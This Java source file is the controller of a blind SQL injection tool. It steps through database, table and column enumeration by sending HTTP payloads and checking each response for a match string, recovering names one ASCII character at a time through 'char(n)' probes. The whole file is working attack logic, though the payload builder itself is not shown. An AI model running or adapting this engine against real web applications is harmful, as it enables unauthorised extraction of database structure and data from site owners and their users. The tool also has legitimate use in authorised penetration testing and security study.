package control;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.ArrayList;
import java.util.List;
import java.util.Vector;

import javax.swing.SwingWorker;
import javax.swing.table.DefaultTableModel;

import config.SystemConfig;
import http.HttpHelper;
import http.HttpPayload;
import http.HttpPayloadFactory;
import input.Step;
import input.UserInput;
import query.QueryParam;
import query.QueryType;
import result.ResultPanel;
import status.StatusPanel;

/**
 *
 * @brief	: 
 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
 * @Date	: 2017/09/05
 */
public class InjectionManager{

	/** http  **/
	private HttpHelper httpHelper = null;
	private HttpPayloadFactory factory = null;
	
	/** ui references **/
	private ControlPanel controlPanel = null;
	private ResultPanel resultPanel = null;
	private StatusPanel statusPanel = null;
	
	/** print variables **/
	private int requestCount = 0;
	private UserInput input = null;
	private SystemConfig config = null;
	private InjectionWorker worker = new InjectionWorker();
	
	/** control variables  **/
	private boolean canceled = false;
	private boolean paused = false;
	private boolean workDone = false;
	
	public InjectionManager() {
		factory = new HttpPayloadFactory();
	}
	
	public void setResultPanel(ResultPanel resultPanel) {
		this.resultPanel = resultPanel;
	}
	
	public void setControlPanel(ControlPanel controlPanel){
		this.controlPanel = controlPanel;
	}
	
	public void setStatusPanel(StatusPanel statusPanel) {
		this.statusPanel = statusPanel;
	}
	

	public void start(UserInput input, SystemConfig config){
		this.input = input;
		this.config = config;
		httpHelper = new HttpHelper();
		// ローカルプロキシ設定がある場合
		if(config.getProxyAddress() != null && !config.getProxyAddress().equals("")) {
			Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(config.getProxyAddress(), 
					Integer.parseInt(config.getPortNum())));
			httpHelper.setProxy(proxy);
		}
		
		System.out.println("[STATUS] canceled : " + canceled +", paused : " + paused + ", workDone : " + workDone);
		
		// case 1. after worker canceled
		if (canceled && !paused) {
			worker = new InjectionWorker();
			//resultPanel.clearResults(); 
		}
		// case 2. after worker job has done (new start) 
		if(workDone){
			System.out.println("start new injection worker. ");
			worker = new InjectionWorker();
		}
		
		// start worker
		worker.execute();
		
		// case 3. after paused 
		if (paused){
			resume();
		}
		
	}
	
	public void pause(){
		System.out.println("===== PAUSE");
		paused = true;
	}
	
	public void stop(){
		worker.cancel(true);
		requestCount = 0;
		canceled = true;
		paused = false;
	}
	
	private synchronized void resume(){
		System.out.println("==== RESUME");
		paused = false;
		this.notify();
	}
	

	class InjectionWorker extends SwingWorker<Boolean, Void> {
		
		@Override
		protected Boolean doInBackground(){
			System.out.println("Step : " + input.getStep());
			try{
				// DB Search
				if(input.getStep() == Step.DB_SCHEMA){
					resultPanel.selectTab(0);
					new DBWorker().search();
				}
				// Table Search
				else if(input.getStep() == Step.TABLE){
					
					resultPanel.selectTab(1);
					new TableWorker().search();
				}
				// Column Search
				else if(input.getStep() == Step.COLUMN) {
					resultPanel.selectTab(2);
					new ColumnWorker().search();
				}
				// Data Search
				// ...
				
				printLog("Worker job has done.");
				workDone = true;
				controlPanel.initButtons();
				return true;
				
			}catch(Exception e){
				printLog("Work Excepiton : " + e.getMessage());
				e.printStackTrace();
			}
			return true;
		}
		
	
		class DBWorker{
		
			public void search(){
				printLog("DB Search Start!");
				printLog("= STEP 1. search db count ");
				QueryParam param = new QueryParam();
				param.setStep(Step.DB_SCHEMA);
				int dbCount = getDBCount(param);
				if(dbCount == 0){
					return ;
				}
				printLog("== [Found!] the db count is : " + dbCount);
	
				DefaultTableModel resultModel =  resultPanel.getDBResultUI().getTableModel();
				for (int i=0; i < dbCount; i++){
					Integer[] row = {i+1};
					resultModel.addRow(row);
				}
				
				printLog("== Find information on individual DB...");
				for(int i=0; i < dbCount; i++) {
					param.setDbIndex(i);
					
					// 1) DB Name length
					int dbNameLength = getDBNameLength(param);
					printLog("== [Found!][" + (i+1) + "] db name length is : " + dbNameLength);
					resultModel.setValueAt(dbNameLength+"", i, 1);
					resultModel.fireTableDataChanged();
					
					// 2) DB Name
					String dbName = getDBName(param, dbNameLength);
					printLog("== [Found!][" + (i+1) + "] db name is : " + dbName);
					resultModel.setValueAt(dbName, i, 2);
					resultModel.fireTableDataChanged();

				}
			}
		
			private int getDBCount(QueryParam param){
				param.setQueryType(QueryType.COUNT);
				return cntWork(param, config.getCountUntil());
			}
			
			private int getDBNameLength(QueryParam param) {
				param.setQueryType(QueryType.LENGTH);
				int length = cntWork(param, config.getLengthUntil());
				return length;
			}

			private String getDBName(QueryParam param, int dbNameLength){
				param.setQueryType(QueryType.CONTENT);
				String content = "";
				for(int i=0; i < dbNameLength ; i++){
					param.setDbNameIndex(i+1); 
					content += contentWork(param);
				}
				return content;
			}
		}
		
		class TableWorker{
			
			public void search(){
				printLog("Table Search Start!");
				QueryParam param = new QueryParam();
				param.setStep(Step.TABLE);
				
				int rowNum = 0;
				Vector<Vector<String>> dbData = resultPanel.getDBResultUI().getTableModel().getDataVector();
				// ユーザがDB名を直接入力した場合、
				if(input.getDbName() != null && !input.getDbName().equals("")) {
					doTableRow(param, input.getDbName(), rowNum);
				}
				// すでに見つかったDBの情報が結果パネルにある場合
				else if(dbData != null  && dbData.size() > 0) {
					for (int i= 0; i < dbData.size(); i++ ){
						Vector<String> dbRow =  dbData.get(i);
						doTableRow(param, dbRow.get(2), rowNum);
					}
				}
			}
			
			private void doTableRow(QueryParam param, String dbName, int rowNum) {
				DefaultTableModel resultModel =  resultPanel.getTableResultUI().getTableModel();
				
				int tableCount = getTableCount(param, dbName);
				printLog("== [Found!][" + dbName + "] table count is : " + tableCount);
				
				for (int j=0; j < tableCount; j++){
					// 0)  prepare row
					String[] tableRow = {(rowNum +1) +"", dbName};
					resultModel.addRow(tableRow);

					// 1) table name length 
					int tableNameLength = getTableNameLength(param, dbName, j);
					printLog("== [Found!][" + dbName + "][" + (j+1) + "'th table] length of table name is : " + tableNameLength);
					resultModel.setValueAt(tableNameLength+"", rowNum, 2);
					
					// 2) table name 
					String tableName = getTableName(param, dbName, tableNameLength);
					printLog("== [Found!][" + dbName + "][" + (j+1) + "'th table] table name is : " + tableName);
					resultModel.setValueAt(tableName, rowNum, 3);

					rowNum ++;
				}
			}
			
			private int getTableCount(QueryParam param, String dbName){
				param.setQueryType(QueryType.COUNT);
				param.setDbName(dbName);
				return cntWork(param, config.getCountUntil());
			}
			
			private int getTableNameLength(QueryParam param, String dbName, int tableIndex){
				param.setQueryType(QueryType.LENGTH);
				param.setDbName(dbName);
				param.setTableIndex(tableIndex);
				return cntWork(param, config.getCountUntil());
			}
			
			private String getTableName(QueryParam param, String dbName, int tableNameLength){
				String content = "";
				param.setQueryType(QueryType.CONTENT);
				param.setDbName(dbName);
				for(int i=0; i < tableNameLength ; i++){
					param.setTableNameIndex(i+1); 
					String chr = contentWork(param); 
					content += chr; 
				}
				return content;
			}
			

		}
		
		class ColumnWorker{
			
			public void search() {
				printLog("Column Search Start!");
				QueryParam param = new QueryParam();
				param.setStep(Step.COLUMN);
				
				DefaultTableModel resultModel =  resultPanel.getColumnResultUI().getTableModel();
				final String dbName = input.getDbName();
				final String tableName = input.getTableName();
				
				int columnCnt = getColumnCount(param, dbName, tableName);
				printLog("== [Found!]["+ dbName + "][" + tableName + "] column count is : " + columnCnt);
				
				int rowNum = 0;
				for (int i=0; i < columnCnt; i++){
					// 0) prepare row
					String[] tableRow = {(rowNum +1) +"", dbName, tableName};
					resultModel.addRow(tableRow);
					
					// 1) column name length
					int columnNameLength = getColumnNameLength(param, dbName, tableName, i);
					printLog("== [Found!]["+ dbName + "][" + tableName + "]["+(i+1)+"]'th column name length is : " + columnNameLength);
					resultModel.setValueAt(columnNameLength+"", rowNum, 3);
					
					// 2) column name
					String columnName = getColumnName(param, dbName, tableName, columnNameLength);
					printLog("== [Found!]["+ dbName + "][" + tableName + "]["+(i+1)+"]'th column name  is : " + columnName);
					resultModel.setValueAt(columnName+"", rowNum, 4);
					
					rowNum ++;
				}
			}
			
			private int getColumnCount(QueryParam param, String dbName, String tableName){
				param.setQueryType(QueryType.COUNT);
				param.setDbName(dbName);
				param.setTableName(tableName);
				return cntWork(param, config.getCountUntil());
			}
			
			private int getColumnNameLength(QueryParam param, String dbName, String tableName, int columnIndex){
				param.setQueryType(QueryType.LENGTH);
				param.setDbName(dbName);
				param.setTableName(tableName);
				param.setColumnIndex(columnIndex);
				return cntWork(param, config.getLengthUntil());
			}
			
			private String getColumnName(QueryParam param, String dbName, String tableName,  int columnNameLength){
				String content = "";
				param.setQueryType(QueryType.CONTENT);
				param.setDbName(dbName);
				param.setTableName(tableName);
				for(int i=0; i < columnNameLength ; i++){
					param.setColumnNameIndex(i+1); 
					String chr = contentWork(param); 
					content += chr; 
				}
				return content;
			}
		}
		
		/*******************************************************************************************************/
		/******************************************* Common ****************************************************/
		/*******************************************************************************************************/
		private int cntWork(QueryParam param, int until){
			
			int cnt = 0;
			for(int i=0; i < until; i++){
				if(!isCancelled()){
					//System.out.println("Cnt work : " + i);
					if(paused){
						//System.out.println("BackGround paused, waiting for resume");
						try{
							synchronized(this){
								wait(1000);
								i--;
							}
						} catch(InterruptedException ex){
							System.out.println("Background interrupted");
						}
					}else{
						requestCount++;
						printRequestCount(requestCount);
						param.setCheckVal(i+"");
						HttpPayload payload = factory.getHttpPayload(input, param);
						String res = httpHelper.send(payload);
						if(res.contains(input.getMatch())){
							cnt = i;
							break;
						}
					}
				}
			}
			return cnt;
		}
		
		private String contentWork(QueryParam param){
			String ascii = "";
			
			for(int j=33; j < 127; j++){ //(search ascii 33~126)
				if(!isCancelled()){
					if(paused){
						//System.out.println("BackGround paused, waiting for resume");
						try{
							synchronized(this){
								wait(1000);
								j--;
							}
						} catch(InterruptedException ex){
							System.out.println("Background interrupted");
						}
					}else{
						requestCount++;
						printRequestCount(requestCount);
						param.setCheckVal("char("+j+")");
						HttpPayload payload = factory.getHttpPayload(input, param);
						String res = httpHelper.send(payload);
						if(res.contains(input.getMatch())){
							ascii = Character.toString((char)j);
							break;
						}
					}
				}
			}
			return ascii;
		}
		
		private void printLog(String msg){
			statusPanel.printLog(msg);
		}
		
		private void printRequestCount(int cnt) {
			statusPanel.printRequestCount(cnt + "");
		}
	}
	
}
